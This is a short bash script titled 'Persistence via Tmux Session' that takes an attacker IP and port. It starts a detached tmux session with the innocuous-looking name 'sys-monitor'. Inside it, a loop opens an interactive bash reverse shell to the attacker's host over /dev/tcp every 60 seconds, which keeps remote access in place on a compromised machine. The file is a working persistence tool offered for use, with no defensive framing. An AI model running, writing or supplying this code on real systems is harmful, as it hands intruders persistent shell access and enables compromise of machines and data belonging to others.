#!/bin/bash
# ==========================================
# Persistence via Tmux Session
# ==========================================
# Usage: ./persistence_tmux.sh <ATTACKER_IP> <PORT>
# Example: ./persistence_tmux.sh 192.168.1.100 4444
# ==========================================

set -e

ATTACKER_IP="$1"
PORT="$2"
SESSION_NAME="sys-monitor"

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# Check tmux
if ! command -v tmux &>/dev/null; then
    echo -e "${RED}[-] tmux not installed${NC}"
    echo -e "${YELLOW}[*] Install: sudo apt install tmux${NC}"
    exit 1
fi

# Check arguments
if [ -z "$ATTACKER_IP" ] || [ -z "$PORT" ]; then
    echo -e "${RED}Usage: $0 <ATTACKER_IP> <PORT>${NC}"
    exit 1
fi

# Kill existing session
tmux kill-session -t "$SESSION_NAME" 2>/dev/null || true

# Create new session with reverse shell
tmux new-session -d -s "$SESSION_NAME" \
    "bash -c 'while true; do bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1; sleep 60; done'"

echo -e "${GREEN}[+] Tmux session created: $SESSION_NAME${NC}"
echo -e "${GREEN}[+] Sessions:${NC}"
tmux ls
